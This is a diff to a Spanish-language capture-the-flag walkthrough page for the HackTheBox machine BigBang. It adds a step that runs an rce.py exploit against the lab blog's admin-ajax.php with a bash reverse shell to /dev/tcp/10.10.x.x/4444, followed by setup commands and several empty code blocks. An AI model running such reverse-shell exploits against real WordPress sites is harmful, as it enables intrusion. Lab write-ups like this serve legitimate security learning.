@@ -97,13 +97,47 @@ wpscan --url http://blog.bigbang.htb -v -e u vp ap --random-user-agent dbe vt cb
 https://www.notion.so/signed/attachment%3Aace055bc-9a36-4fa0-ab84-3cb844b7b788%3Ainitial_exploit.py?table=block&id=18873e8e-2181-805d-b761-f7953d12f977&spaceId=23f8e6c4-d5a3-4565-b3fc-0b07a5534651&userId=8b7c069b-958a-4d18-9ff7-2f470772ff8e&cache=v2
 https://www.notion.so/signed/attachment%3A7057fcef-35d2-4395-86f0-7d6a55db976a%3Alibc.so.6?table=block&id=18873e8e-2181-8058-a69f-f3b507dcaa14&spaceId=23f8e6c4-d5a3-4565-b3fc-0b07a5534651&userId=8b7c069b-958a-4d18-9ff7-2f470772ff8e&cache=v2
 </code></pre>
+<p>Ahora que ya entendimos un poco vamos a realizarlo.</p>
+<pre><code>
+   python3 rce.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"'         
+</code></pre>
+<p>vamos a encontrarnos con dos problemas.</p>
+<p>Soluciones.</p>
+<pre><code>
+python3 -m venv myenv
+source myenv/bin/activate
+pip install ten
+</code></pre>
+
+<pre><code>
+pw
+python3 -m venv pwntools-env
+source pwntools-env/bin/activate
+pip install pwntools             
+</code></pre>
+<p>Ahora podemos correrlo.</p>
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20160821.png?raw=true" alt="Captura de pantalla">
+
+
+
+<pre><code>
+             
+</code></pre>
+
+
+ 
+<pre><code>
+             
+</code></pre>
 
 
 
 
 
 
-
+<pre><code>
+             
+</code></pre>
 
 <p>.</p>
 <p>.</p>
